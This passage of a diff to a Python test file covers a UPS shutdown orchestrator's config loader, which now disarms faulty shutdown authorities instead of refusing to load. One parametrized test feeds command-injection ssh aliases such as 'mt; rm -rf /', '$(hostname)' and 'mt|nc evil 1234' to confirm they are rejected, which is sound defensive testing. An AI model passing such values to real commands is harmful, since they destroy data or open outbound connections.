@@ -249,10 +249,13 @@ def test_monitored_machines_default_empty(tmp_path: Path) -> None:
     assert cfg.monitored_machines == ()
 
 
-def test_dual_regime_conflict_detected(tmp_path: Path) -> None:
-    # P2-06: mutual exclusion is enforced, not warned. "mt" has a ups and no
-    # explicit method, so it derives "native"; an enabled shutdown_target with the
-    # same name on that UPS is the classic double-shutdown and is now a load error.
+def test_dual_regime_conflict_degrades_and_loads(tmp_path: Path) -> None:
+    # RA-01 (round 2), replacing the round-1 hard ValueError. "mt" has a ups and no
+    # explicit method, so it derives "native"; an enabled shutdown_target with the same
+    # name on that UPS is the classic double-shutdown. Mutual exclusion is still
+    # ENFORCED — but by disarming the disarmable authority, not by refusing to load.
+    # Config.load raising here made every real NUT power event a silent successful
+    # no-op, because _cmd_event returns 0 when _load_config returns None (IW-06).
     p = _write(
         tmp_path,
         {
@@ -260,13 +263,24 @@ def test_dual_regime_conflict_detected(tmp_path: Path) -> None:
             "upses": {
                 "u1": {
                     "label": "U1",
-                    "shutdown_targets": [{"name": "mt", "enabled": True}],
+                    "shutdown_targets": [{"name": "mt", "enabled": True, "host": "mt"}],
                 }
             },
         },
     )
-    with pytest.raises(ValueError, match="BOTH shutdown regimes"):
-        Config.load(p, env={})
+    cfg = Config.load(p, env={})
+    (machine,) = cfg.monitored_machines
+    # Declared native: the surviving authority is the remote box's own upsmon, which
+    # lives in that box's /etc. Config cannot disarm it and must not claim to.
+    assert machine.shutdown_method == "native"
+    assert machine.disarmed is False
+    assert machine.effective_method == "native"
+    # The legacy target IS in-process, so disabling it is real.
+    (target,) = cfg.ups("u1").shutdown_targets  # type: ignore[union-attr]
+    assert target.enabled is True  # the DECLARATION is never rewritten
+    assert target.effective_enabled is False
+    assert cfg.degraded
+    assert any("monitor remove mt" in n.message for n in cfg.degraded)
 
 
 def test_dual_regime_no_conflict_when_target_disabled(tmp_path: Path) -> None:
@@ -393,13 +407,27 @@ def test_from_dict_explicit_method_wins_over_derivation() -> None:
     assert m.shutdown_method == "ssh"
 
 
-def test_legacy_serial_backup_without_serial_fields_rejected() -> None:
-    # A legacy backup {enabled:true, kind:serial} has no serial_device/baud to project;
-    # it must raise a clear migration error rather than derive an unfireable serial.
-    with pytest.raises(ValueError, match="serial"):
-        MonitoredMachine.from_dict(
-            {"name": "mt", "backup": {"enabled": True, "kind": "serial"}}
-        )
+def test_legacy_serial_backup_without_serial_fields_degrades(tmp_path: Path) -> None:
+    # A legacy backup {enabled:true, kind:serial} has no serial_device/baud to project.
+    # 02-01 made that a hard ValueError in from_dict; RA-01 removes it. Hard-failing the
+    # whole daemon over an INERT field is the exact MED-08 outage — MonitoredMachine.backup
+    # has zero runtime consumers, so this shape never fired anything in Phase 1 either.
+    # It now parses, and Config.load disarms it with the migration remedy still named.
+    m = MonitoredMachine.from_dict({"name": "mt", "backup": {"enabled": True, "kind": "serial"}})
+    assert m.shutdown_method == "serial"
+
+    p = _write(
+        tmp_path,
+        {
+            "upses": {"cyberpower": {"label": "CP"}},
+            "monitored_machines": [{"name": "mt", "backup": {"enabled": True, "kind": "serial"}}],
+        },
+    )
+    cfg = Config.load(p, env={})
+    (machine,) = cfg.monitored_machines
+    assert machine.disarmed is True
+    assert machine.effective_method == "none"
+    assert any("migrate" in n.message.lower() for n in machine.load_notices)
 
 
 def test_round_trip_preserves_new_fields() -> None:
@@ -420,57 +448,128 @@ def test_round_trip_preserves_new_fields() -> None:
     assert out["backup"] == {"enabled": False, "kind": "remote"}
 
 
-def test_transport_valid_serial_empty_device_rejected(tmp_path: Path) -> None:
-    p = _write(
+def _one_machine(tmp_path: Path, machine: dict[str, object]) -> Config:
+    """Load a config whose only content is ``machine`` on a configured UPS."""
+    return Config.load(
+        _write(
+            tmp_path,
+            {"upses": {"cyberpower": {"label": "CP"}}, "monitored_machines": [machine]},
+        ),
+        env={},
+    )
+
+
+def _sole(cfg: Config) -> MonitoredMachine:
+    (machine,) = cfg.monitored_machines
+    return machine
+
+
+def test_transport_serial_empty_device_degrades(tmp_path: Path) -> None:
+    # A machine's transport being unconfigurable is not a reason to stop watching the
+    # UPS. Disarm that machine; keep monitoring, alerting and notifying.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "serial",
+                "serial_baud": 9600,
+            },
+        )
+    )
+    assert m.disarmed is True
+    assert m.effective_method == "none"
+    assert any("serial_device" in n.message for n in m.load_notices)
+
+
+def test_transport_serial_nonpositive_baud_degrades(tmp_path: Path) -> None:
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "serial",
+                "serial_device": "/dev/ttyUSB0",
+                "serial_baud": 0,
+            },
+        )
+    )
+    assert m.disarmed is True
+    assert any("baud" in n.message for n in m.load_notices)
+
+
+def test_transport_serial_absent_baud_degrades_and_is_never_assumed(tmp_path: Path) -> None:
+    # Deliberate behaviour change 3 (P2-08): an ABSENT serial_baud on a serial machine
+    # DISARMS rather than silently assuming 9600. Assuming one is the same
+    # silent-coercion class as HI-04, and a far-end mismatch writes garbage down the
+    # line while still returning rc 0 — a silent no-shutdown.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "serial",
+                "serial_device": "/dev/ttyUSB0",
+            },
+        )
+    )
+    assert m.disarmed is True
+    assert any("serial_baud" in n.message for n in m.load_notices)
+
+
+def test_transport_serial_unparseable_baud_quotes_the_operators_own_value(
+    tmp_path: Path,
+) -> None:
+    # HI-04 end to end: the notice quotes what the operator WROTE, not a sentinel the
+    # parser invented, and the persist path leaves their value alone (INV-DEGRADE).
+    cfg = _one_machine(
         tmp_path,
         {
-            "upses": {"cyberpower": {"label": "CP"}},
-            "monitored_machines": [
-                {
-                    "name": "mt",
-                    "ups": "cyberpower",
-                    "shutdown_method": "serial",
-                    "serial_baud": 9600,
-                }
-            ],
+            "name": "mt",
+            "ups": "cyberpower",
+            "shutdown_method": "serial",
+            "serial_device": "/dev/ttyUSB0",
+            "serial_baud": "fast",
         },
     )
-    with pytest.raises(ValueError, match="serial"):
-        Config.load(p, env={})
+    m = _sole(cfg)
+    assert m.disarmed is True
+    assert any("'fast'" in n.message for n in m.load_notices)
+    assert m.to_dict()["serial_baud"] == "fast"
 
 
-def test_transport_valid_serial_nonpositive_baud_rejected(tmp_path: Path) -> None:
-    p = _write(
-        tmp_path,
-        {
-            "upses": {"cyberpower": {"label": "CP"}},
-            "monitored_machines": [
-                {
-                    "name": "mt",
-                    "ups": "cyberpower",
-                    "shutdown_method": "serial",
-                    "serial_device": "/dev/ttyUSB0",
-                    "serial_baud": 0,
-                }
-            ],
-        },
+def test_transport_serial_device_must_live_under_dev(tmp_path: Path) -> None:
+    # MED-10 (config half): _default_serial_shutdown opens the device with mode "wb",
+    # which TRUNCATES a regular file — so a typo'd path destroys that file and reports
+    # success. The transport-side guard is 02-07.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "serial",
+                "serial_device": "/etc/ups-orchestrator/config.json",
+                "serial_baud": 9600,
+            },
+        )
     )
-    with pytest.raises(ValueError, match="baud"):
-        Config.load(p, env={})
+    assert m.disarmed is True
+    assert any("/dev/" in n.message for n in m.load_notices)
 
 
-def test_transport_valid_ssh_empty_alias_rejected(tmp_path: Path) -> None:
-    p = _write(
-        tmp_path,
-        {
-            "upses": {"cyberpower": {"label": "CP"}},
-            "monitored_machines": [
-                {"name": "mt", "ups": "cyberpower", "shutdown_method": "ssh", "ssh": ""}
-            ],
-        },
+def test_transport_ssh_empty_alias_degrades(tmp_path: Path) -> None:
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {"name": "mt", "ups": "cyberpower", "shutdown_method": "ssh", "ssh": ""},
+        )
     )
-    with pytest.raises(ValueError, match="ssh"):
-        Config.load(p, env={})
+    assert m.disarmed is True
+    assert any("ssh" in n.message for n in m.load_notices)
 
 
 def test_legacy_baud_default_now_9600() -> None:
@@ -505,49 +604,87 @@ def _mutual_exclusion_config(tmp_path: Path, machine: dict[str, object]) -> Path
     )
 
 
-def test_mutual_exclusion_native_legacy_target_raises(tmp_path: Path) -> None:
-    # native + enabled legacy target: the secondary fires below LB and the target
-    # fires on the external-group thresholds — the live double-shutdown (events.py).
-    p = _mutual_exclusion_config(
-        tmp_path,
-        {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "native"},
+def _only_target(cfg: Config, ups_key: str = "cyberpower") -> ShutdownTarget:
+    ups = cfg.ups(ups_key)
+    assert ups is not None
+    (target,) = ups.shutdown_targets
+    return target
+
+
+def test_mutual_exclusion_native_leaves_the_remote_authority_armed(tmp_path: Path) -> None:
+    # RA-01 split by authority type. Round 1 applied the push disposition here and
+    # rendered a live native secondary as disarmed in monitor list — WHILE the box still
+    # halts on FSD. That is the mirror image of the failure this phase exists to
+    # prevent: an operator told a machine is unprotected when it is not. It also fed
+    # 02-03's transition guard a cosmetic "none", which would have permitted a
+    # native->push switch with the remote upsmon still live.
+    cfg = Config.load(
+        _mutual_exclusion_config(
+            tmp_path,
+            {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "native"},
+        ),
+        env={},
     )
-    with pytest.raises(ValueError, match="shutdown_method=native"):
-        Config.load(p, env={})
+    m = _sole(cfg)
+    assert m.shutdown_method == "native"
+    assert m.disarmed is False
+    assert m.effective_method == "native"
+    # The legacy target is in-process, so THAT disarm is real.
+    assert _only_target(cfg).effective_enabled is False
+    # Exactly one authority survives, and the notice says which, and how to disarm it.
+    (notice,) = [n for n in m.load_notices if n.severity == "error"]
+    assert "monitor remove mt" in notice.message
+    assert "monitor verify mt" in notice.message
 
 
-def test_mutual_exclusion_none_legacy_target_raises(tmp_path: Path) -> None:
-    # none + enabled legacy target: the machine is declared OFF yet still gets shut
-    # down by the legacy regime. Fail closed rather than honour the stale target.
-    p = _mutual_exclusion_config(
-        tmp_path,
-        {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "none"},
+def test_mutual_exclusion_none_degrades(tmp_path: Path) -> None:
+    # none + enabled legacy target: the machine is declared OFF yet the legacy regime
+    # would still shut it down. Fail closed rather than honour the stale target.
+    cfg = Config.load(
+        _mutual_exclusion_config(
+            tmp_path,
+            {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "none"},
+        ),
+        env={},
     )
-    with pytest.raises(ValueError, match="shutdown_method=none"):
-        Config.load(p, env={})
+    assert _sole(cfg).effective_method == "none"
+    assert _only_target(cfg).effective_enabled is False
 
 
-def test_mutual_exclusion_serial_legacy_target_raises(tmp_path: Path) -> None:
-    p = _mutual_exclusion_config(
-        tmp_path,
-        {
-            "name": "mt",
-            "ups": "cyberpower",
-            "shutdown_method": "serial",
-            "serial_device": "/dev/ttyUSB0",
-        },
+def test_mutual_exclusion_serial_disarms_machine_and_target(tmp_path: Path) -> None:
+    cfg = Config.load(
+        _mutual_exclusion_config(
+            tmp_path,
+            {
+                "name": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "serial",
+                "serial_device": "/dev/ttyUSB0",
+                "serial_baud": 9600,
+            },
+        ),
+        env={},
     )
-    with pytest.raises(ValueError, match="shutdown_method=serial"):
-        Config.load(p, env={})
+    m = _sole(cfg)
+    assert m.shutdown_method == "serial"  # the declaration is inviolable
+    assert m.disarmed is True
+    assert m.effective_method == "none"
+    assert _only_target(cfg).effective_enabled is False
+    assert {n.subject for n in cfg.degraded} == {"mt", "cyberpower/mt"}
 
 
-def test_mutual_exclusion_ssh_legacy_target_raises(tmp_path: Path) -> None:
-    p = _mutual_exclusion_config(
-        tmp_path,
-        {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "ssh"},
+def test_mutual_exclusion_ssh_disarms_machine_and_target(tmp_path: Path) -> None:
+    cfg = Config.load(
+        _mutual_exclusion_config(
+            tmp_path,
+            {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "ssh"},
+        ),
+        env={},
     )
-    with pytest.raises(ValueError, match="shutdown_method=ssh"):
-        Config.load(p, env={})
+    m = _sole(cfg)
+    assert m.disarmed is True
+    assert m.effective_method == "none"
+    assert _only_target(cfg).effective_enabled is False
 
 
 def test_mutual_exclusion_ignores_target_on_a_different_ups(tmp_path: Path) -> None:
@@ -1156,3 +1293,627 @@ def test_unprojectable_push_machines_silent_on_native_and_on_resolvable_push() -
     # "none" is not a push method.
     off = _machines({"name": "off", "shutdown_method": "none"})
     assert unprojectable_push_machines(off, upses) == ()
+
+
+# --- Plan 02-06 Task 3: Config.load — the hard-fail line and the degrade accumulator ---
+#
+# ONE rule: a config error that makes the file unparseable, or that corrupts the
+# MONITORING TOPOLOGY, is fatal; a config error that makes a SHUTDOWN AUTHORITY unsafe
+# or unfireable disarms that authority — if it is disarmable — and always loads.
+
+
+def test_unreadable_file_raises(tmp_path: Path) -> None:
+    with pytest.raises(OSError):
+        Config.load(tmp_path / "does-not-exist.json", env={})
+
+
+def test_malformed_json_raises(tmp_path: Path) -> None:
+    p = tmp_path / "config.json"
+    p.write_text("{ not valid json ")
+    with pytest.raises(ValueError):
+        Config.load(p, env={})
+
+
+def test_non_object_json_root_raises_value_error(tmp_path: Path) -> None:
+    # LO-15: this escaped cli._load_config's (OSError, ValueError) handler as a raw
+    # AttributeError traceback. json.JSONDecodeError is a ValueError subclass, so
+    # matching the class here keeps the handler's contract.
+    for root in ([], "a string", 7):
+        p = tmp_path / "config.json"
+        p.write_text(json.dumps(root))
+        with pytest.raises(ValueError, match="JSON object"):
+            Config.load(p, env={})
+
+
+def test_non_object_entry_inside_upses_raises(tmp_path: Path) -> None:
+    # Previously filtered out silently: a monitored UPS vanishing from the topology is
+    # not a shutdown-authority error, it is a monitor that stops watching a UPS.
+    p = _write(tmp_path, {"upses": {"good": {"label": "G"}, "bad": "not-an-object"}})
+    with pytest.raises(ValueError, match="bad"):
+        Config.load(p, env={})
+
+
+def test_upses_that_all_filter_out_raises(tmp_path: Path) -> None:
+    # A non-empty raw `upses` whose values are ALL non-objects passed the existing
+    # emptiness check and then filtered to {}; watch would poll zero UPSes and look
+    # healthy. Loud refusal beats a silently useless daemon.
+    p = _write(tmp_path, {"upses": {"a": "x", "b": 7}})
+    with pytest.raises(ValueError, match="[Nn]o usable"):
+        Config.load(p, env={})
+
+
+def test_colliding_canonical_ups_keys_raise(tmp_path: Path) -> None:
+    p = _write(tmp_path, {"upses": {"cyberpower2": {"label": "a"}, "CyberPower2": {"label": "b"}}})
+    with pytest.raises(ValueError, match="canonical"):
+        Config.load(p, env={})
+
+
+def test_load_accepts_a_str_path(tmp_path: Path) -> None:
+    # LO-16, reproduced by the live probe against the real config file:
+    # AttributeError: 'str' object has no attribute 'read_text' — the same
+    # escaped-handler class as LO-15.
+    p = _write(tmp_path, {"upses": {"u1": {"label": "U1"}}})
+    assert Config.load(str(p), env={}).ups("u1") is not None
+
+
+# --- BL-01 end to end: the shapes the reviewer probed as a silent clean load ---
+
+
+def _bl01_config(tmp_path: Path, machine: dict[str, object]) -> Config:
+    return Config.load(
+        _write(
+            tmp_path,
+            {
+                "monitored_machines": [machine],
+                "upses": {
+                    "cyberpower2": {
+                        "label": "CP2",
+                        "shutdown_targets": [
+                            {
+                                "name": "mt",
+                                "kind": "serial",
+                                "enabled": True,
+                                "device": "/dev/ttyUSB0",
+                                "baud": 9600,
+                            }
+                        ],
+                    }
+                },
+            },
+        ),
+        env={},
+    )
+
+
+def test_bl01_derived_ssh_with_no_ups_degrades(tmp_path: Path) -> None:
+    # The reviewer's first live probe: machine mt with ssh + backup{enabled:true,
+    # kind:remote} and NO ups, against an enabled serial target named mt. It loaded
+    # silently and reported an active method. It is now disarmed on BOTH counts —
+    # dual-regime AND unprojectable — and says so.
+    cfg = _bl01_config(
+        tmp_path, {"name": "mt", "ssh": "mt", "backup": {"enabled": True, "kind": "remote"}}
+    )
+    m = _sole(cfg)
+    assert m.shutdown_method == "ssh"  # derived
+    assert m.disarmed is True
+    assert m.effective_method == "none"
+    assert _only_target(cfg, "cyberpower2").effective_enabled is False
+    assert any("never" in n.message for n in m.load_notices)
+
+
+def test_bl01_explicit_ssh_with_no_ups_degrades(tmp_path: Path) -> None:
+    cfg = _bl01_config(tmp_path, {"name": "mt", "ssh": "mt", "shutdown_method": "ssh"})
+    m = _sole(cfg)
+    assert m.disarmed is True
+    assert _only_target(cfg, "cyberpower2").effective_enabled is False
+
+
+def test_bl01_case_mismatched_ups_conflict_degrades(tmp_path: Path) -> None:
+    # The reviewer's second live probe: machine mt with ups "CyberPower2" against an
+    # enabled target mt on "cyberpower2". HI-03/IB-02.
+    cfg = _bl01_config(
+        tmp_path, {"name": "mt", "ssh": "mt", "ups": "CyberPower2", "shutdown_method": "ssh"}
+    )
+    m = _sole(cfg)
+    assert m.disarmed is True
+    assert _only_target(cfg, "cyberpower2").effective_enabled is False
+
+
+# --- LO-13 duplicates: lossless on disk, fail-closed on shutdown ---
+
+
+def test_duplicate_machine_names_keep_every_record_and_disarm_all(tmp_path: Path) -> None:
+    # Dropping the duplicate mutated what _monitor_persist writes — it rewrites the
+    # whole array from cfg.monitored_machines — so an unrelated `monitor remove <other>`
+    # would have silently DELETED an operator-authored record, possibly the one carrying
+    # the real device and baud. Keeping every record is lossless on disk; disarming all
+    # of them is fail-closed, since firing "one of the two mt records" is a guess.
+    p = _write(
+        tmp_path,
+        {
+            "upses": {"cyberpower": {"label": "CP"}},
+            "monitored_machines": [
+                {"name": "mt", "ssh": "mt-a", "ups": "cyberpower", "shutdown_method": "ssh"},
+                {"name": "MT", "ssh": "mt-b", "ups": "cyberpower", "shutdown_method": "ssh"},
+            ],
+        },
+    )
+    cfg = Config.load(p, env={})
+    assert len(cfg.monitored_machines) == 2
+    assert all(m.disarmed for m in cfg.monitored_machines)
+    assert all(
+        any("duplicate" in n.message.lower() for n in m.load_notices)
+        for m in cfg.monitored_machines
+    )
+    # A round-trip through to_dict still yields two records: no degrade deletes one.
+    assert [m.to_dict()["ssh"] for m in cfg.monitored_machines] == ["mt-a", "mt-b"]
+
+
+# --- IW-05: the hand-edit hole no CLI guard can close ---
+
+
+def test_push_declaration_carrying_a_native_enrollment_ip_is_disarmed(tmp_path: Path) -> None:
+    # `ip` is the nft saddr address resolved by _resolve_remote_ip and is written ONLY
+    # by the native enrollment path. A push record carrying one is a probable
+    # hand-edited former native secondary whose remote upsmon was never torn down: two
+    # live authorities, one FSD self-halt plus one push. Config cannot know whether the
+    # remote upsmon is armed, but it CAN recognise the fingerprint. Fail closed.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "spark",
+                "ssh": "spark",
+                "ups": "cyberpower",
+                "shutdown_method": "ssh",
+                "ip": "192.168.1.125",
+            },
+        )
+    )
+    assert m.disarmed is True
+    (notice,) = [n for n in m.load_notices if n.severity == "error"]
+    assert "monitor verify spark" in notice.message
+    assert "monitor remove spark" in notice.message
+
+
+def test_push_declaration_without_an_ip_is_not_disarmed(tmp_path: Path) -> None:
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "ssh"},
+        )
+    )
+    assert m.disarmed is False
+    assert m.effective_method == "ssh"
+
+
+# --- T-02-10: the ssh alias reaches an unattended argv ---
+
+
+@pytest.mark.parametrize(
+    "alias",
+    [
+        "-oProxyCommand=curl evil",  # option-shaped: ssh interprets it as an option
+        "mt; rm -rf /",
+        "mt host",
+        "$(hostname)",
+        "`hostname`",
+        "mt|nc evil 1234",
+    ],
+)
+def test_option_shaped_or_metacharacter_ssh_alias_disarms(tmp_path: Path, alias: str) -> None:
+    # m.ssh flows into ssh_dest and then into an argv element. Before 02-02 that value
+    # only ever reached a foreground operator command; after 02-02 it reaches an
+    # UNATTENDED subprocess at outage time. The inconsistency was its own evidence:
+    # --shutdown-cmd rejects a double-quote, the IP literals are validated and
+    # machine.ups is guarded, while the alias alone got nothing.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {"name": "mt", "ssh": alias, "ups": "cyberpower", "shutdown_method": "ssh"},
+        )
+    )
+    assert m.disarmed is True
+    assert any(repr(alias) in n.message for n in m.load_notices)
+
+
+@pytest.mark.parametrize("alias", ["mt", "mt.lan", "MT-1", "root@mt.example.com", "mt:2222", "m_t"])
+def test_plain_ssh_alias_is_accepted(tmp_path: Path, alias: str) -> None:
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {"name": "mt", "ssh": alias, "ups": "cyberpower", "shutdown_method": "ssh"},
+        )
+    )
+    assert m.disarmed is False
+
+
+# --- HI-05 corrected: native with a blank ups is REPORTED, never disarmed ---
+
+
+def test_native_with_blank_ups_is_reported_not_disarmed(tmp_path: Path) -> None:
+    m = _sole(
+        _one_machine(tmp_path, {"name": "spark", "ssh": "spark", "shutdown_method": "native"})
+    )
+    assert m.disarmed is False
+    assert m.effective_method == "native"
+    (notice,) = m.load_notices
+    assert notice.severity == "advisory"
+    assert "monitor verify spark" in notice.message
+
+
+# --- NEW-2, VALUE-based (round-4 blocker 2) ---
+
+
+def test_new2_advises_a_push_record_at_the_default_shutdown_cmd(tmp_path: Path) -> None:
+    # THE shape every persisted record actually has, and the one a key-presence detector
+    # misses entirely: to_dict writes shutdown_cmd unconditionally, cli.py defaults
+    # --shutdown-cmd method-independently, and _monitor_add writes it into every record
+    # it builds. So every record ever persisted carries the key at exactly the
+    # wrong-for-push value.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ssh": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "ssh",
+                "shutdown_cmd": "/sbin/shutdown -h now",
+            },
+        )
+    )
+    (notice,) = m.load_notices
+    assert notice.severity == "advisory"
+    assert "shutdown_cmd" in notice.message
+    # Advisory, never a disarm: config cannot know the far end's user, and a root
+    # auto-login getty makes the default correct.
+    assert m.disarmed is False
+    assert m.effective_method == "ssh"
+
+
+def test_new2_advises_a_push_record_with_the_key_absent(tmp_path: Path) -> None:
+    # from_dict materialises the same default, so key presence carries no signal at all.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "ssh"},
+        )
+    )
+    assert [n.severity for n in m.load_notices] == ["advisory"]
+
+
+def test_new2_silent_on_an_escalated_push_command(tmp_path: Path) -> None:
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ssh": "mt",
+                "ups": "cyberpower",
+                "shutdown_method": "ssh",
+                "shutdown_cmd": "sudo /sbin/shutdown -h now",
+            },
+        )
+    )
+    assert m.load_notices == ()
+
+
+def test_new2_silent_on_native_at_the_default(tmp_path: Path) -> None:
+    # upsmon executes SHUTDOWNCMD as root, so the default is CORRECT for native.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "spark",
+                "ssh": "spark",
+                "ups": "cyberpower",
+                "shutdown_method": "native",
+                "shutdown_cmd": "/sbin/shutdown -h now",
+            },
+        )
+    )
+    assert m.load_notices == ()
+
+
+# --- BL-02: routed to Config.degraded, not journal-only ---
+
+
+def test_explicit_none_with_a_ups_is_an_advisory_in_degraded(tmp_path: Path) -> None:
+    # RA-01's own argument is that a log line is an insufficient operator surface, so
+    # the detector must obey it. Advisory, not a disarm: a "none" machine legitimately
+    # carries a ups for inventory and projection scoping.
+    cfg = _one_machine(
+        tmp_path,
+        {"name": "spark", "ssh": "spark", "ups": "cyberpower", "shutdown_method": "none"},
+    )
+    (notice,) = cfg.degraded
+    assert notice.severity == "advisory"
+    assert notice.subject == "spark"
+    assert "monitor verify spark" in notice.message
+    assert _sole(cfg).disarmed is False
+
+
+# --- BLOCKER-1: the severity fold, end to end through Config.load ---
+
+
+def test_advisory_only_push_machine_loads_still_armed(tmp_path: Path) -> None:
+    # The guard round 3 was missing. An executor reaching for the only helper that
+    # existed would have made every push machine carrying the NEW-2 advisory
+    # effective_method="none": never projected, never fired, and reported
+    # DISARMED (declared ssh) rc 1 — precisely the "operator believes protected, machine
+    # does not shut down" outcome this phase exists to prevent, manufactured out of the
+    # mechanism meant to prevent it.
+    cfg = _one_machine(
+        tmp_path,
+        {"name": "mt", "ssh": "mt", "ups": "cyberpower", "shutdown_method": "ssh"},
+    )
+    m = _sole(cfg)
+    assert m.load_notices and all(n.severity == "advisory" for n in m.load_notices)
+    assert m.disarmed is False
+    assert m.effective_method == m.shutdown_method == "ssh"
+    assert cfg.degraded and all(n.severity == "advisory" for n in cfg.degraded)
+
+
+def test_push_machine_with_an_advisory_and_an_error_is_disarmed_and_keeps_both(
+    tmp_path: Path,
+) -> None:
+    # A push machine can legitimately earn BOTH the NEW-2 advisory and a T-02-10
+    # ssh-alias error in one load. The tuple accumulates; the fold decides.
+    m = _sole(
+        _one_machine(
+            tmp_path,
+            {
+                "name": "mt",
+                "ssh": "-oProxyCommand=x",
+                "ups": "cyberpower",
+                "shutdown_method": "ssh",
+            },
+        )
+    )
+    assert {n.severity for n in m.load_notices} == {"advisory", "error"}
+    assert m.disarmed is True
+    assert m.effective_method == "none"
+
+
+# --- the legacy-target disarm set, through Config.load ---
+
+
+def test_unfireable_legacy_targets_are_disarmed(tmp_path: Path) -> None:
+    p = _write(
+        tmp_path,
+        {
+            "upses": {
+                "cyberpower": {
+                    "label": "CP",
+                    "shutdown_targets": [
+                        {"name": "no-host", "kind": "remote", "enabled": True},
+                        {"name": "odd-kind", "kind": "telepathy", "enabled": True, "host": "h"},
+                        {"name": "no-device", "kind": "serial", "enabled": True, "baud": 9600},
+                        {
+                            "name": "bad-baud",
+                            "kind": "serial",
+                            "enabled": True,
+                            "device": "/dev/ttyUSB0",
+                            "baud": "fast",
+                        },
+                        {"name": "healthy", "kind": "remote", "enabled": True, "host": "h"},
+                    ],
+                }
+            }
+        },
+    )
+    cfg = Config.load(p, env={})
+    ups = cfg.ups("cyberpower")
+    assert ups is not None
+    effective = {t.name: t.effective_enabled for t in ups.shutdown_targets}
+    assert effective == {
+        "no-host": False,
+        "odd-kind": False,
+        "no-device": False,
+        "bad-baud": False,
+        "healthy": True,
+    }
+    # Declarations are never rewritten.
+    assert all(t.enabled for t in ups.shutdown_targets)
+    assert {n.subject for n in cfg.degraded} >= {"cyberpower/no-host", "cyberpower/odd-kind"}
+
+
+def test_advise_target_is_the_mirror_of_disarm_target() -> None:
+    # The fourth helper. Two doors per kind, named for their severity, so picking the
+    # wrong one is a visible, reviewable, testable choice rather than the silent
+    # consequence of there being only one.
+    from ups_orchestrator.config import _advise_target, _disarm_target
+
+    t = ShutdownTarget(name="mt", kind="remote", enabled=True, host="mt")
+    advised = _advise_target("cyberpower", t, "look at this")
+    assert advised.enabled is True
+    assert advised.effective_enabled is True
+    assert advised.load_notices[0].severity == "advisory"
+    assert advised.load_notices[0].subject == "cyberpower/mt"
+    # ...and appending, never overwriting.
+    both = _disarm_target("cyberpower", advised, "and this")
+    assert [n.severity for n in both.load_notices] == ["advisory", "error"]
+    assert both.effective_enabled is False
+
+
+# --- the live production shape must stay clean ---
+
+
+def test_live_production_shape_loads_with_an_empty_degraded(tmp_path: Path) -> None:
+    # Ground truth from /etc/ups-orchestrator/config.json, read read-only on 2026-07-26:
+    # ONE monitored machine (spark), no shutdown_method key, no serial fields,
+    # backup {enabled:false, kind:remote}, empty shutdown_targets on all three UPSes,
+    # and shutdown.enabled false. RA-01 ships as design, not incident response — this
+    # asserts the real file is not degraded by any rule in this plan.
+    p = _write(
+        tmp_path,
+        {
+            "shutdown": {"enabled": False, "external": {"enabled": False}},
+            "upses": {
+                "cyberpower": {"label": "CP", "shutdown_targets": []},
+                "cyberpower2": {"label": "CP2", "shutdown_targets": []},
+                "cyberpower3": {"label": "CP3", "shutdown_targets": []},
+            },
+            "monitored_machines": [
+                {
+                    "name": "spark",
+                    "ssh": "spark",
+                    "ups": "cyberpower3",
+                    "powervalue": 1,
+                    "os": "auto",
+                    "backup": {"enabled": False, "kind": "remote"},
+                }
+            ],
+        },
+    )
+    cfg = Config.load(p, env={})
+    m = _sole(cfg)
+    assert m.shutdown_method == "native"
+    assert m.disarmed is False
+    assert cfg.degraded == ()
+
+
+# --- the two property tests: one config carrying every degradable defect at once ---
+
+EVERY_DEFECT: dict[str, object] = {
+    "upses": {
+        "cyberpower": {
+            "label": "CP",
+            "shutdown_targets": [
+                # dual-regime partners
+                {"name": "mt", "kind": "remote", "enabled": True, "host": "mt"},
+                {"name": "spark", "kind": "remote", "enabled": True, "host": "spark"},
+                # the legacy-target disarm set
+                {"name": "no-host", "kind": "remote", "enabled": True},
+                {"name": "odd-kind", "kind": "telepathy", "enabled": True, "host": "h"},
+                {
+                    "name": "bad-baud",
+                    "kind": "serial",
+                    "enabled": True,
+                    "device": "/dev/ttyUSB0",
+                    "baud": "fast",
+                },
+            ],
+        },
+        "cyberpower2": {"label": "CP2", "shutdown_targets": []},
+    },
+    "monitored_machines": [
+        # dual-regime push conflict + NEW-2 advisory
+        {
+            "name": "mt",
+            "ssh": "mt",
+            "ups": "cyberpower",
+            "shutdown_method": "ssh",
+            "shutdown_cmd": "/sbin/shutdown -h now",
+            "_comment": "the dell",
+        },
+        # dual-regime NATIVE conflict — must stay armed
+        {
+            "name": "spark",
+            "ssh": "spark",
+            "ups": "cyberpower",
+            "shutdown_method": "native",
+            "_comment": "live secondary",
+        },
+        # LO-13 duplicates: both kept, both disarmed
+        {"name": "dup", "ssh": "dup-a", "ups": "cyberpower2", "shutdown_method": "ssh"},
